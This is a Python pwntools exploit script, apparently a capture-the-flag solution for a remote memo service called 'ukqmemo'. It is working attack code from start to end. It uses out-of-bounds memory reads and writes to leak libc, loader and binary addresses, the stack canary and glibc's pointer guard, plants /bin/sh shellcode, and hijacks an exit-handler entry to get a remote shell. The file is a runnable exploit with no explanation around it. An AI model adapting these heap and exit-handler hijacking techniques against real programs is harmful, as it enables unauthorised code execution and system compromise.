#!/usr/bin/env python3
from pwn import *
context.update(arch='amd64', os='linux')
p, u = pack, unpack

def check_byte(b):
    # bytes eaten by qemu tty weirdness
    assert b not in [3, 4, 10, 17, 19, 21, 26, 28, 127], b

def check_bytes(bs):
    for b in bs:
        check_byte(b)

SHELLCODE = asm(shellcraft.sh())
check_bytes(SHELLCODE)

r = remote('ukqmemo.seccon.games', 6318)
_, param, token = r.recvline().decode().strip().split()
assert param == '-mb26', param
result = subprocess.check_output(['hashcash', '-q', '-mb26', token])
r.sendline(result.strip())

r.recvuntil(b'login: ')
r.sendline(b'ctf')
r.recvuntil(b'> ')

def read_fixed(index):
    r.sendline(b'1') # fixed

    r.recvuntil(b'> ')
    r.sendline(b'1')  # read

    r.recvuntil(b'Index: ')
    r.sendline(str(index).encode())

    r.recvuntil(b'Output: ')
    data = r.recvn(0x100)
    r.recvuntil(b'> ')

    r.sendline(b'0')
    r.recvuntil(b'> ')

    return data

def write_fixed(index, data, read_prompt=True):
    check_bytes(data)

    r.sendline(b'1') # fixed

    r.recvuntil(b'> ')
    r.sendline(b'2')  # write

    r.recvuntil(b'Index: ')
    r.sendline(str(index).encode())

    r.recvuntil(b'Input: ')
    if not read_prompt:

        pause()

    r.send(data)
    if len(data) < 0x100:
        r.send(b'\n')

    if read_prompt:
        r.sendline(b'0')
        r.recvuntil(b'> ')

def read_free(offset, size):
    r.sendline(b'2') # free

    r.recvuntil(b'> ')
    r.sendline(b'1')  # read

    r.recvuntil(b'Offset: ')
    r.sendline(str(offset).encode())

    r.recvuntil(b'Size: ')
    r.sendline(str(size).encode())

    r.recvuntil(b'Output: ')
    data = r.recvn(size)
    r.recvuntil(b'> ')

    r.sendline(b'0')
    r.recvuntil(b'> ')

    return data

def write_free(offset, data):
    check_bytes(data)

    r.sendline(b'2') # free

    r.recvuntil(b'> ')
    r.sendline(b'2')  # write

    r.recvuntil(b'Offset: ')
    r.sendline(str(offset).encode())

    r.recvuntil(b'Size: ')
    r.sendline(str(len(data)).encode())

    r.recvuntil(b'Input: ')
    r.send(data)

    r.sendline(b'0')
    r.recvuntil(b'\n> ')

offset = (1 << 30) - 0x1000 - 1
data = read_free(offset, 1024)[1:]
buf_addr = u(data[:8])
mmap_addr = buf_addr - 0x100
print('mmap_addr =', hex(mmap_addr))

ld_base = mmap_addr + 0x191000
print('ld_base =', hex(ld_base))

libc_base = mmap_addr + 0x3000
print('libc_base =', hex(libc_base))

libc_stack_end_addr = ld_base + 0x2ba10
exit_handlers = libc_base + 0x17D660
fs_base = ld_base - 0x980

existing = p(buf_addr)
def set_addr(addr):
    global existing
    to_write = p(addr)
    for i in range(8):
        if to_write[i:] == existing[i:]:
            to_write = to_write[:i]
            break;
    for o, b in list(enumerate(to_write))[::-1]:
        check_byte(b)
        data = b'A' * (o + 1)
        data += bytearray([b])
        write_free(offset, data)
    existing = p(addr)

    wrote = u(read_free(offset, 9)[1:])
    assert wrote == addr, hex(wrote) + ' vs ' + hex(addr)

set_addr(libc_stack_end_addr)
libc_stack_end = u(read_fixed(0)[:8])
print('libc_stack_end =', hex(libc_stack_end))

set_addr(libc_stack_end - 0x18)
start_ret_addr = u(read_fixed(0)[:8])
binary_base = start_ret_addr - 0x1265
print('binary_base =', hex(binary_base))

shellcode_addr = libc_stack_end + 0x100
print('shellcode_addr =', hex(shellcode_addr))
set_addr(shellcode_addr)
write_fixed(0, SHELLCODE)

set_addr(fs_base)
tls = read_fixed(0)
stack_canary = u(tls[0x28:0x30])
pointer_guard = u(tls[0x30:0x38])
print('stack_canary = ', hex(stack_canary))
print('pointer_guard = ', hex(pointer_guard))

def rol64(value, n):
    MASK = (1 << 64) - 1
    return ((value << n) | (value >> (64 - n))) & MASK

def mangle(ptr):
    return rol64(ptr ^ pointer_guard, 17)

bss_addr = binary_base + 0x4800

set_addr(exit_handlers)
write_fixed(0, p(bss_addr))

set_addr(bss_addr)
fake_exit_function_list = b''
fake_exit_function_list += b'A' * 8 # next
fake_exit_function_list += p(1) # idx
fake_exit_function_list += p(2) # flavor
fake_exit_function_list += p(mangle(shellcode_addr)) # fn
fake_exit_function_list += b'B' * 8 # arg
write_fixed(0, fake_exit_function_list)

r.sendline(b'0')

context.log_level = 'debug'
r.interactive(prompt='')
